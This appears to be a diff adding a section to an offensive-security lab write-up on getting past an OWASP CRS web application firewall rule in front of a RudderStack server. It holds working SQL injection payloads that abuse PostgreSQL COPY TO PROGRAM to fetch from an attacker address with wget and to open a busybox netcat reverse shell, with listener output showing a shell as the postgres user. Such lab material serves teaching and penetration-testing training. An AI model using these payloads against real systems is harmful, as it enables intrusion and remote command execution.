@@ -401,3 +401,81 @@ student@rudder:~$
 The logs indicate our attack triggered the `"SQL Authentication bypass (split query)"` rule, which can be found in `/ruleset/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf`. We'll analyze this file in the next section to understand how the rule works.
 
 ### Analyzing the WAF Ruleset
+We can find `REQUEST-942-APPLICATION-ATTACK-SQLI.conf` in `/home/student/caddy/ruleset/rules/`. To review the file in code-server, we can browse to `http://rudderstack:8000/?folder=/home/student/caddy` and open the relevant directories. After searching for `"SQL Authentication bypass (split query)"`, we can find the relevant rule starting on line `547`.
+
+```
+# This rule catches an authentication bypass via SQL injection that abuses semi-colons to end the SQL query early.
+# Any characters after the semi-colon are ignored by some DBMSes (e.g. SQLite).
+#
+# An example of this would be:
+#   email=admin%40juice-sh.op';&password=foo
+#
+# The server then turns this into:
+#   SELECT * FROM users WHERE email='admin@juice-sh.op';' AND password='foo'
+#
+# Regular expression generated from regex-assembly/942540.ra.
+# To update the regular expression run the following shell script
+# (consult https://coreruleset.org/docs/development/regex_assembly/ for details):
+#   crs-toolchain regex update 942540
+#
+SecRule REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/* "@rx ^(?:[^']*'|[^\"]*\"|[^`]*`)[\s\v]*;" \
+    "id:942540,\
+    phase:2,\
+    block,\
+    capture,\
+    t:none,t:urlDecodeUni,t:replaceComments,\
+    msg:'SQL Authentication bypass (split query)',\
+    logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\
+    tag:'application-multi',\
+    tag:'language-multi',\
+    tag:'platform-multi',\
+    tag:'attack-sqli',\
+    tag:'OWASP_CRS',\
+    tag:'capec/1000/152/248/66',\
+    tag:'PCI/6.5.2',\
+    tag:'paranoia-level/1',\
+    ver:'OWASP_CRS/4.0.0-rc2',\
+    severity:'CRITICAL',\
+    setvar:'tx.sql_injection_score=+%{tx.critical_anomaly_score}',\
+    setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'"
+```
+In this case, it uses a string that starts with `"@rx"` to denote a regular expression. The WAF engine will use this regex when it inspects a request. Although the regular expression in this rule may seem complex, it's essentially checking for a closing quote (`'`) followed by a semicolon (`;`). The comments on this rule aren't entirely accurate with regard to why attackers use semicolons. The example payload we've been working with uses a semicolon to create stacked queries. PostgreSQL, MySQL, and Microsoft SQL Server will execute multiple SQL statements if passed a single string of semicolon-separated queries.
+
+### Bypassing the WAF
+Since the regular expression checks for a single quote followed by a semicolon, we need to update our payload. We don't care about the SQL statement we're injecting into, so we can modify that part of our payload in any number of ways.
+
+We could add a number comparison after the single quote and before the semicolon. This would separate the single quote and semicolon. The exact value we use before the semicolon doesn't matter as long as it's valid SQL syntax. The outcome of the first SQL statement does not impact the outcome of the stacked or secondary SQL statement, as long as it does not generate a syntax error.
+
+We'll use the following JSON body:
+```json
+{ "source_id":"' or 1=2; copy (select 'a') to program 'wget -q http://192.168.45.203:80/it_will_bypass' -- - ", "task_run_id":"1"}
+```
+We can use an online tool like [regex101](https://regex101.com/) to test if the rule's regular expression matches our payload. When testing the regular expression, we don't need to include `"@rx"` since that is part of the SecRule definition, not the regular expression.
+
+Based on the output from regex101, our payload should not be caught by the regular expression. There might be additional WAF rules that we aren't aware of, but let's try sending our updated payload. We'll need to start an HTTP server if we don't already have one running.
+
+We received an error from the server, but the WAF did not block our request. Let's check our HTTP server.
+```bash
+┌──(kali㉿kali)-[~]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.130.144 - - [31/Jul/2025 21:27:28] code 404, message File not found
+192.168.130.144 - - [31/Jul/2025 21:27:28] "GET /it_will_bypass HTTP/1.1" 404 -
+
+```
+
+#### Reverse Shell
+```json
+{ "source_id":"' or 1=2; copy (select 'a') to program 'busybox nc 192.168.45.203 1337 -e sh' -- - ", "task_run_id":"1"}
+```
+Netcat listener:
+```bash
+┌──(kali㉿kali)-[~]
+└─$ nc -nlvp 1337
+listening on [any] 1337 ...
+connect to [192.168.45.203] from (UNKNOWN) [192.168.130.144] 37067
+id
+uid=70(postgres) gid=70(postgres) groups=70(postgres),70(postgres)
+
+```
+**Automation Script:** 
